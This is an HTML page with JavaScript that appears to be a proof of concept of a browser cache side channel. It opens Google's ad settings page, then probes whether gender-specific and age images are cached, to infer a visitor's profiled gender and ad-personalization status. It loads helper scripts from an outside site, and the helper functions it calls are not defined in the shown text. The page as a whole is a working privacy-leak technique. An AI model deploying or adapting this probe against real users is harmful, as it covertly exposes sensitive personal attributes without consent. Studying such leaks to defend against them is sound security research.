<head>
    <title>Gender Detect</title>
    <script src="http://ndev.tk/mirror/HackTimer/HackTimer.min.js"></script>
    <script src="https://cache.ndev.tk/embed.js"></script>
</head>
<style>
    * {
        color: green;
    }
</style>
<body>
    <h1>Gender Detect</h1>
    <p1>Detects Gender:</p1>
	<button onclick="getGender()">Click!</button>
</body>
<script>
Rules = new Map();

function getGender() {
	var ads = open("https://adssettings.google.com/authenticated");
	setTimeout(_ => {
		ads.close();
		GenderDetect();
	}, 500)
}

async function getRules() {
    Gender("female");
	Gender("male");
    return Rules
}

function Gender(g) {
    Rules.set("https://www.gstatic.com/identity/boq/adssettingsui/demographic/i_gender_"+g+"_ee2fb99c014437125dfe9358e4ea50aa.svg", g);
}

async function AdPref() {
	return await ifCached("https://www.gstatic.com/identity/boq/adssettingsui/demographic/i_age_ee6695b8688539f7175e364579d4a749.svg");
}

async function GenderDetect() {
    setTimeout(async _ => {
	    var result = await AdPref();
	    if(!result) {
			return alert("Ad personalization is OFF");
		}
		result = await getWebsites();
		var gender = (result.length === 1) ? result[0] : "Rather not say";
		// Allow JS to finsh
		setTimeout(_ => {
			if(result.length > 1) {
				alert("Multiple genders cached");
			} else {
				alert(gender);
			}
		}, 50)
    }, 500)
}
</script>
